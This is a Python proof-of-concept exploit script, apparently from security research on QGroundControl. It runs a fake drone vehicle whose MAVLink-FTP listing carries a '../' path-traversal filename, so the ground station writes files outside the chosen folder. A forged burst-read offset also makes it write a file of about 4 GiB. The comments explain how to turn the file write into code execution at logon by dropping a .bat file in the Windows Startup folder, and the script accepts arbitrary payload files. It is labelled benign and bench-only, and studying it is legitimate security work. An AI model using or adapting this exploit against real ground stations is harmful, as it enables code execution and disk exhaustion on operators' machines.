...
class FakeVehicle:
    ...
    def _handle_ftp(self, msg):
        ...
        if op == self.OP_LIST:
            ...
            # We don't implement the WithTime variant; NACK with the specific
            # ERR_UNKNOWN_COMMAND code so FTPManager::_listDirectoryAckOrNak
            # falls back to plain OP_LIST (kCmdListDirectory) on its retry,
            # instead of treating the whole listDirectory() call as failed.
...
# BENIGN relative traversal. Forward slashes so QDir::filePath() concatenates and
# the '..' segments walk up out of the chosen save folder. Lands a marker in /tmp.
# Keep it SHORT and harmless; do not target system files.
#
# Tested (and deliberately NOT kept as CLI options): Unicode homoglyphs or a
# bidi/RTL-override on the traversal segments themselves. Both are dead ends,
# not just unconvincing -- QDir/the OS path walker splits on literal '/' and
# requires an EXACT byte match against '..' (and against any real directory
# name being traversed, e.g. 'tmp'). A lookalike character or an embedded
# bidi-control byte makes that segment fail to match, which breaks the
# traversal outright rather than disguising it. The only segment that can
# safely carry non-literal bytes is the leaf filename being created, since it
# doesn't need to match anything pre-existing -- and disguising just the leaf
# doesn't hide the '../../...' prefix, which is the actually load-bearing (and
# visibly obvious) part of the string. See README §12/Novelty for writeup.
# NOTE (live-test gotcha): QGC opens the traversed path with
# QFile::open(WriteOnly|Truncate) at FTPManager.cc:786-787 -- on the OpenFileRO ACK,
# BEFORE any body is read. Qt does NOT create intermediate directories, so if the
# traversed-to directory does not already exist the open() fails and QGC reports a
# bare "Download failed" with nothing written. The traversal still reached the sink;
# only the create did not. Depth beyond the filesystem root is also CLAMPED (on
# Windows 8x '..' from %LOCALAPPDATA%\Temp lands at C:\, not below it), so an
# over-deep prefix silently retargets. Pick a path whose PARENT EXISTS on the
# target OS, or override with --traversal-name.
DEFAULT_TRAVERSAL_NAME = "../../../../../../../../tmp/QGC03_PWNED.lua"
TRAVERSAL_NAME = DEFAULT_TRAVERSAL_NAME

# Normal name used in diskfill mode (no traversal; we abuse the burst OFFSET instead).
NORMAL_NAME = "benign_script.lua"

# Near-4 GiB offset (uint32). The harness packs offset & 0xFFFFFFFF; QGC seeks here.
HUGE_OFFSET = 0xFFFFF000  # ~4.29 GiB - one page; benign-ish, still demonstrates the seek.


class DiskFillVehicle(FakeVehicle):
    """Overrides BurstReadFile to answer with a single ACK at a huge offset,
    exercising the unbounded file.seek(hdr.offset) sink (FTPManager.cc:855)."""
    ...
    def _ftp_read(self, req, burst):
        sess = self._ftp_sessions.get(req["session"])
        if sess is None or not burst:
            return super()._ftp_read(req, burst)
        # One malicious burst ACK: tiny data, ENORMOUS offset, burst_complete=1.
        # QGC: seek(HUGE_OFFSET); write(data) -> ~4 GiB file from one frame.
        attack("BURST: answering with hdr.offset=0x%08X (~%.2f GiB) -> QGC seeks there"
               % (HUGE_OFFSET, HUGE_OFFSET / float(1 << 30)))
        self._ftp_reply(req, self.OP_ACK, size=4, req_opcode=self.OP_BURST_READ,
                        burst=1, offset=HUGE_OFFSET, data=b"PWND")
        self._fired_burst = True


def build_traversal_vehicle(name=None, body=None):
    name = name or DEFAULT_TRAVERSAL_NAME
    body = BENIGN_LUA if body is None else body

    def _extra(p):
        p.add_argument("--traversal-name", metavar="RELPATH", default=DEFAULT_TRAVERSAL_NAME,
                       help="listing entry name QGC reuses as the LOCAL filename. "
                            "Its parent dir must already exist on the GCS host "
                            "(Qt will not mkdir -p). default: %(default)s")
        p.add_argument("--payload", choices=sorted(PAYLOADS), default="lua",
                       help="built-in file body to serve. 'lua' = inert ArduPilot marker; "
                            "'bat' = benign Windows batch that proves logon execution "
                            "when the traversal targets the Startup folder. default: %(default)s")
        p.add_argument("--payload-file", metavar="PATH",
                       help="serve this local file's bytes as the body instead of a built-in")

    v = FakeVehicle.from_cli("QGC-03 MAVFTP listing path-traversal local write",
                             extra_args=_extra)
    # The file body QGC will read back and write to the traversed local name.
    v.add_ftp_file(name, body)
    # The ListDirectory entry. 'F' type + this name + "\t<size>" is what the harness
    # packs; QGC's filteredEntries strips ONLY the 'F' and the "\t<size>", leaving the
    # '../...' intact, and uses it as the LOCAL filename on download.
    v.add_ftp_dir_entry(name, size=len(body), is_dir=False)
    return v


def build_diskfill_vehicle():
    # Reuse from_cli's parsed conn string but with our subclass.
    base = FakeVehicle.from_cli("QGC-03 MAVFTP burst unbounded-offset disk-fill")
    v = DiskFillVehicle(base.conn_str, sysid=base.sysid, compid=base.compid,
                        verbose=base.verbose)
    v.add_ftp_file(NORMAL_NAME, BENIGN_LUA)
    # OpenFileRO will report a small size; QGC then BURST-reads and we lie about offset.
    v.add_ftp_dir_entry(NORMAL_NAME, size=len(BENIGN_LUA), is_dir=False)
    return v


def main():
    # Peek at --mode without disturbing the harness's own arg parsing.
    pre = argparse.ArgumentParser(add_help=False)
    pre.add_argument("--mode", choices=["traversal", "diskfill"], default="traversal")
    pre.add_argument("--traversal-name", metavar="RELPATH", default=DEFAULT_TRAVERSAL_NAME)
    pre.add_argument("--payload", choices=sorted(PAYLOADS), default="lua")
    pre.add_argument("--payload-file", metavar="PATH")
    args, _ = pre.parse_known_args()

    banner("QGC-03: MAVLink-FTP listing -> path-traversal local write + unbounded burst offset")
    warn("BENIGN PoC. Authorized localhost/bench QGroundControl only.")

    if args.mode == "traversal":
        observe("mode=traversal: serving ListDirectory entry %r" % args.traversal_name)
        observe("On download, QGC should write the body to that traversed local path.")
        observe("Expected success indicator: the body appears at <save folder>/%s"
                % args.traversal_name)
        warn("The traversed-to PARENT DIRECTORY must already exist on the GCS host --")
        warn("QGC opens it WriteOnly|Truncate and Qt will not create it. A missing dir")
        warn("shows up as a bare 'Download failed' with no BurstReadFile request below.")

        if args.payload_file:
            with open(args.payload_file, "rb") as fh:
                body = fh.read()
            observe("payload: %d bytes from %s" % (len(body), args.payload_file))
        else:
            body = PAYLOADS[args.payload]
            observe("payload: built-in %r (%d bytes)" % (args.payload, len(body)))

        # The extension is attacker-controlled too, and it has to match the body:
        # Windows executes .bat/.cmd from Startup, but has no handler for .lua.
        low = args.traversal_name.lower()
        exec_ext = low.endswith((".bat", ".cmd"))
        if exec_ext and body is BENIGN_LUA:
            warn("MISMATCH: target ends in .bat/.cmd but the body is ArduPilot Lua.")
            warn("cmd.exe will error on it. Add --payload bat for the batch body.")
        if (not exec_ext) and body is BENIGN_BAT:
            warn("MISMATCH: serving the batch body but the target is not .bat/.cmd --")
            warn("Windows will not execute it. Rename the --traversal-name leaf.")
        if "startup" in low and not exec_ext:
            warn("Targeting Startup with a non-executable extension: '.lua' has no")
            warn("shell association, so nothing runs at logon. Use a .bat leaf.")

        v = build_traversal_vehicle(args.traversal_name, body)
    else:
        observe("mode=diskfill: serving normal name %r, abusing BurstReadFile offset" % NORMAL_NAME)
        observe("Expected success indicator: a ~4 GiB file in the chosen save folder")
        observe("(check with `ls -ls` for the SPARSE apparent-vs-real size).")
        v = build_diskfill_vehicle()

    v.start()
    attack("MAVFTP server up. In QGC: TCP link to 127.0.0.1:5760, connect, then")
    attack("Vehicle Setup -> Lua Scripting -> click the download button -> pick a folder.")
    v.serve_forever()
